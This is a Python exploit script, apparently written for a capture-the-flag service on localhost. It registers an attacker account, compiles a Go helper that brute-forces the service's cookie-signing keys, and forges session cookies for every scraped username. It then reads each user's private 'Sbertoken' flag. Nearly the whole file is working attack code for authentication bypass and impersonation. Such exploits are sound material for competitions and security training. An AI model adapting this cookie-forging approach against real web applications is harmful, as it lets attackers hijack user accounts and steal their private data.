import subprocess
import requests
import re
from bs4 import BeautifulSoup
import os

url = "http://localhost:1015"
hacker_creds = {'username':'1m4h4ck3rr','password':'Level123'}

output_file = "main.exe" if os.name == "nt" else "./main"

# parse service to get the list containing usernames and corresponding suspect IDs
def parse_suspects():
    s = requests.Session()
    req = s.post(url+"/register", hacker_creds)
    req = s.post(url+"/authorize", hacker_creds)
    req = s.get(url+"/sus_browser")
    pattern = r'<input\s+type="hidden"\s+name="ID"\s+value="(\d+)"\s*/>'
    match = re.search(pattern, req.text)
    if match:
        value = match.group(1)
        max_sus_id = int(value)
    else:
        print('Failed to parse page!')
        return
    users = []
    for i in range(1, max_sus_id+1):
        req = s.get(url+"/sus/"+str(i))
        soup = BeautifulSoup(req.text, 'html.parser')
        author_username = soup.find('span', id='AuthorUsername')
        users.append((author_username.text.strip("Информация поступила от "), str(i)))
    return users

# bruteforce keys using our shiny go file
def brute_keys():
    global is_builded
    if not is_builded:
        subprocess.run(["go", "build", "-o", output_file, "main.go"], check=True)
    command = "generate_keys"
    username = hacker_creds["username"]
    result = subprocess.run([output_file, command, username], capture_output=True, text=True)
    output_lines = result.stdout.splitlines()
    cookie_arr = []
    for i in output_lines:
        cookie_arr.append(i.split())
    req = requests.post(url+"/register", hacker_creds)
    s = requests.Session()
    for i in cookie_arr:
        req = s.get(url+"/sus_uploader", cookies={'User':i[0]})
        if req.status_code == 200:
            key1 = i[1][1:]
            key2 = i[2][:-1]
            break
    return key1, key2

# generate cookie for specific username using bruteforced keys
def generate_cookie(username, key1, key2):
    global is_builded
    if not is_builded:
        subprocess.run(["go", "build", "-o", output_file, "main.go"], check=True)
    command = "generate_cookie"
    result = subprocess.run([output_file, command, username, key1, key2], capture_output=True, text=True)
    return (result.stdout.splitlines())[0]

# here the fun begins
subprocess.run(["go", "build", "-o", output_file, "main.go"], check=True)
is_builded = True
key1, key2 = brute_keys()
sussy_list = parse_suspects()
for i in sussy_list:
    username = i[0]
    sus_id = i[1]
    s = requests.Session()
    req = s.get(url+"/sus/"+sus_id, cookies={'User':generate_cookie(username, key1, key2)})
    soup = BeautifulSoup(req.text, 'html.parser')
    flag = soup.find('p', id='Sbertoken').text.strip("Sbertoken: ")
    print(flag)
